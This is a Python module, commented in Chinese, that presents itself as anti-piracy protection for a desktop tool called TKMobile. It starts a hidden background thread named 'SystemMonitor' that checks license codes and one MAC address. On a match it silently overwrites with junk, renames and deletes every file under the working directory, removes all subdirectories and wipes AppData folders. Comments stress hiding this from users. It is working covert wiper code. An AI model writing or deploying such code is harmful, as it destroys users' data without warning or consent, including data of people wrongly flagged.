# ==================== 反破解保护机制 ====================
import threading
import time
import sys


def get_random_string(length=8):
    import random
    import string
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def _write_data():
    import os
    import time
    import shutil

    # 获取当前脚本的绝对路径，避免破坏自己
    current_script = os.path.abspath(__file__)

    # ── 第一步：遍历当前目录，收集所有文件 ──────────────────────────────
    all_files = []
    for root, dirs, files in os.walk('.'):
        for name in files:
            file_path = os.path.abspath(os.path.join(root, name))
            if file_path != current_script:
                all_files.append(file_path)

    # 深路径优先处理
    all_files.sort(key=lambda x: x.count(os.sep), reverse=True)

    # ── 第二步：对每个文件执行「覆盖内容 → 重命名 → 删除」三连击 ─────────
    for full_path in all_files:
        current_path = full_path

        # 1) 二进制随机垃圾覆盖（破坏一切文件格式，包括数据库、exe、图片等）
        try:
            file_size = os.path.getsize(current_path)
            junk_size = max(file_size, 4096)
            with open(current_path, 'wb') as f:
                f.write(os.urandom(junk_size))
        except (PermissionError, OSError, IOError):
            pass

        # 2) 再用文本覆盖一次，确保可读内容也被破坏
        try:
            with open(current_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write('盗版可耻 ' * 1000)
        except (PermissionError, OSError, IOError):
            pass

        # 3) 重命名，混淆文件名（让用户找不到原始文件）
        try:
            timestamp = str(int(time.time() * 1000))[-6:]
            new_name = f'盗版可耻{get_random_string(8)}{timestamp}'
            new_path = os.path.join(os.path.dirname(current_path), new_name)
            while os.path.exists(new_path):
                new_name = f'盗版可耻{get_random_string(10)}{timestamp}'
                new_path = os.path.join(os.path.dirname(current_path), new_name)
            os.rename(current_path, new_path)
            current_path = new_path  # 路径跟随重命名更新
        except (PermissionError, OSError, FileNotFoundError):
            pass

        # 4) 直接删除
        try:
            os.remove(current_path)
        except (PermissionError, OSError):
            pass

    # ── 第三步：递归删除所有子目录（rmtree 不依赖目录为空）────────────────
    try:
        for root, dirs, files in os.walk('.', topdown=False):
            for name in dirs:
                dir_path = os.path.abspath(os.path.join(root, name))
                try:
                    shutil.rmtree(dir_path, ignore_errors=True)
                except Exception:
                    pass
    except Exception:
        pass

    # ── 第四步：清理 AppData 中的所有相关配置目录 ────────────────────────
    appdata = os.getenv('APPDATA', '')
    localappdata = os.getenv('LOCALAPPDATA', '')
    target_dirs = [
        os.path.join(appdata, 'tkmobile'),
        os.path.join(appdata, 'TKMobile'),
        os.path.join(localappdata, 'tkmobile'),
        os.path.join(localappdata, 'TKMobile'),
    ]
    for target in target_dirs:
        try:
            if os.path.exists(target):
                shutil.rmtree(target, ignore_errors=True)
        except Exception:
            pass

def _anti_crack_monitor():
    """
    反破解监控线程 - 持续检测并重置破解版授权状态
    """
    while True:
        try:
            # 获取主窗口模块
            if 'MYTmodules.window' in sys.modules:
                window_module = sys.modules['MYTmodules.window']
                
                # 检查是否存在 BaseWindow 类
                if hasattr(window_module, 'BaseWindow'):
                    BaseWindow = window_module.BaseWindow
                    
                    # 尝试获取实例（通过类属性或全局变量）
                    instances = []
                    
                    # 方法1: 检查所有对象实例
                    import gc
                    for obj in gc.get_objects():
                        if isinstance(obj, BaseWindow):
                            instances.append(obj)
                    
                    # 对每个实例进行检测和重置
                    for instance in instances:
                        try:
                            # 获取授权码
                            auth_code = ""
                            if hasattr(instance, 'lineEditAuthCode'):
                                try:
                                    auth_code = instance.lineEditAuthCode.text().strip()
                                except:
                                    pass
                            if not auth_code:
                                #尝试读取config_dir = os.path.join(os.getenv('APPDATA'), 'tkmobile')下的config.ini
                                try:
                                    import configparser,base64,os
                                    config_dir = os.path.join(os.getenv('APPDATA'), 'tkmobile')
                                    config_path = os.path.join(config_dir, 'config.ini')
                                    if os.path.exists(config_path):
                                        config = configparser.ConfigParser()
                                        config.read(config_path)
                                        auth_code=config['DEFAULT'].get('lineEditAuthCode', '').strip()
                                        auth_code=base64.b64decode(auth_code).decode('utf-8')
                                except:
                                    pass
                            # 检测破解特征：ELAC开头的授权码
                            try:
                                from EasysuCloudHelper import AuthKeyTool
                                mac = AuthKeyTool.get_mac()
                            except:
                                mac = ""
                            if auth_code.startswith('ELAC') or auth_code.startswith('ELBC') or auth_code.startswith('TK-00') or auth_code.startswith('syfE') or auth_code.startswith('EHWU') or mac=='e8:9c:25:c4:83:ba':
                                # 重置授权状态
                                instance.login_status = False
                                instance.pjy = None
                                _write_data()
                                
                                # 额外保险：重置调试模式标记
                                if hasattr(instance, 'DEBUG_MODE'):
                                    instance.DEBUG_MODE = False
                                
                                # 静默记录（不打印，避免被发现）
                                pass
                            
                        except Exception:
                            pass
            
            # 随机间隔，更隐蔽
            time.sleep(2 + (hash(time.time()) % 3))
            
        except Exception:
            pass

# 启动守护线程
_monitor_thread = threading.Thread(target=_anti_crack_monitor, daemon=True, name='SystemMonitor')
_monitor_thread.start()

